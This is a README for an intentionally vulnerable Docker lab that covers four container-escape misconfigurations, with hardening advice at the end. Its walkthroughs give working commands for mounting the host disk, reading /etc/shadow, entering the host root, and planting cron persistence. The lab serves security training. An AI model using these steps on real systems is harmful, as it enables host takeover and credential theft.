# Docker Escape Lab 🐳🔓
### Hands-on Practice Lab for Docker Container Escape & Linux Kernel Isolation

<p align="center">
  <img src="https://img.shields.io/badge/Docker-20.10%2B-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
  <img src="https://img.shields.io/badge/Linux-Kernel_5.x%2B-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />
  <img src="https://img.shields.io/badge/Security-Container_Escape-E95420?style=for-the-badge" alt="Security" />
  <img src="https://img.shields.io/badge/License-MIT-success?style=for-the-badge" alt="License MIT" />
</p>

<p align="center"><strong>English</strong> · <a href="README.vi.md">Tiếng Việt</a></p>

> **LEGAL & ETHICAL DISCLAIMER:**  
> This project contains intentionally vulnerable container configurations designed exclusively for educational, penetration testing, and security training purposes on isolated local machines. Never apply these breakout techniques against infrastructure you do not own or lack written authorization to test.

---

## Overview

**Docker Escape Lab** provides four distinct, real-world container breakout scenarios modeled after the most common architectural misconfigurations observed in modern DevOps, CI/CD pipelines, and cloud-native environments:

| # | Vector | Misconfiguration | Core Mechanism | Impact |
|---|---|---|---|---|
| 1 | **Docker Daemon Socket** | `-v /var/run/docker.sock:...` | Unix domain socket API control | Spawn new root container mounting host root (`chroot`) |
| 2 | **Privileged Container** | `privileged: true` | Direct host block device access | Mount host disk (`/dev/sda`, `/dev/nvme`) into container |
| 3 | **Shared PID Namespace** | `pid: host` + `SYS_PTRACE` | `/proc` cross-process traversal | Direct host rootfs access via `/proc/1/root` |
| 4 | **Sensitive Volume Mount** | `-v /:/host:rw` | Host filesystem write primitive | Cron persistence / SSH key injection / Rogue root user |

---

## Quick Start

### Prerequisites
- Docker & Docker Compose v2+ installed.
- Linux host or WSL2 (Windows with Docker Desktop).

### Setup

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Verify that all target containers are running:

```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```

---

## Attack Walkthroughs

### Vector 1: Docker Daemon Socket (`/var/run/docker.sock`)
When a container is granted access to the Docker daemon socket, it possesses root control over the host engine:

```bash
# Enter the target container
docker exec -it lab-sock-escape bash

# Method A: Using Docker CLI
docker run --rm -it -v /:/host alpine chroot /host

# Method B: Pure curl via Unix domain socket (no CLI needed)
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

### Vector 2: Privileged Container (`--privileged`)
In privileged mode, the container's `/dev` tree exposes the host's actual hardware and virtual disks:

```bash
# Enter the privileged container
docker exec -it lab-privileged-escape bash

# Inspect available host disks
lsblk

# Mount the host drive directly
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk

# Read host sensitive files
head -n 5 /mnt/host_disk/etc/shadow
```

### Vector 3: Shared Host PID Namespace (`--pid=host`)
Sharing the host's PID namespace exposes the host's init process (PID 1) and enables traversal into the host's root mount namespace:

```bash
# Enter the PID target container
docker exec -it lab-pid-escape bash

# Verify host processes are visible
ps aux | head -n 10

# Traverse host root filesystem via procfs
ls -la /proc/1/root/
cat /proc/1/root/etc/passwd
```

### Vector 4: Sensitive Host Volume Mount (`/:/host:rw`)
Mounting the host filesystem directly allows turning a write primitive into persistent host execution:

```bash
# Enter the volume target container
docker exec -it lab-volume-escape sh

# Persistence via host crontab
echo "* * * * * root touch /tmp/host_escaped" > /host/etc/cron.d/pwn_cron
chmod 644 /host/etc/cron.d/pwn_cron
```

---

## Defensive Hardening

1. **Protect the Docker Socket:** Never mount `/var/run/docker.sock` into workloads. For monitoring, deploy a read-only Docker Socket Proxy (`tecnativa/docker-socket-proxy`).
2. **Ban `--privileged`:** Drop all capabilities by default (`--cap-drop=ALL`) and re-add only what is strictly required (`--cap-add=NET_BIND_SERVICE`).
3. **Enforce Read-Only Filesystem:** Run containers with `--read-only` and mount temporary writable directories via `--tmpfs /tmp`.
4. **Enable User Namespaces (`userns-remap`):** Map root inside the container to an unprivileged high UID on the host.
5. **Run Rootless Containers:** Run Docker in rootless mode or switch to rootless Podman.

---

## Teardown

```bash
docker compose down
```

---

## Author & Blog

Detailed analysis, deep-dive technical mechanics, and architectural breakdowns are published at:
- **Tech Notes Blog:** [https://khanh1916.github.io/notes](https://khanh1916.github.io/notes)
- **Author:** Nguyen Nam Khanh ([@Khanh1916](https://github.com/Khanh1916))

## License

This project is licensed under the [MIT License](LICENSE).
